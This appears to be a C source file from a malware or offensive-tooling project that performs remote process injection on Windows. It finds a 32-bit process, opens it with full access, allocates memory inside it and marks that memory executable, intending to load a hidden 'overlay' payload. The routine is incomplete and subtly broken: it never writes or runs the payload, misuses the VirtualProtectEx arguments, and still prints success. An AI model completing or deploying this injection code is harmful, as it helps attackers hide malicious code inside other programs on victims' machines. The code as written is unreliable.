#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>
#include "..\..\Shared\overlay.c"
#include "..\..\Shared\findProcess.c"

typedef void* HANDLE;


void remoteExeInjection(){
    struct Overlay overlay;
    getOverlay(overlay);

    int pid = findPidOf32BitProcess();
    if (pid == 0){
        perror("Injection failed. Suitable process could not be found.\n");
        exit(EXIT_FAILURE);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == INVALID_HANDLE_VALUE){
        perror("Injection failed. Process could not be opened.\n");
        exit(EXIT_FAILURE);
    }

    LPVOID remoteProcessAddress = VirtualAllocEx(hProcess, NULL, overlay.overlaySize, MEM_COMMIT, PAGE_READWRITE);
    if (remoteProcessAddress == NULL){
        perror("Injection failed. Could not allocate memory in remote process.\n");
        exit(EXIT_FAILURE);
    }



    if(VirtualProtectEx(hProcess, remoteProcessAddress, overlay.overlaySize, PAGE_EXECUTE_READ, PAGE_READWRITE) == 0){
        perror("Injection failed. Could not change memory protection in remote process.\n");
        exit(EXIT_FAILURE);
    }

    puts("Injection successfull.");

}

int main(int argc, char *argv[]){
    remoteExeInjection();
    return 0;
}
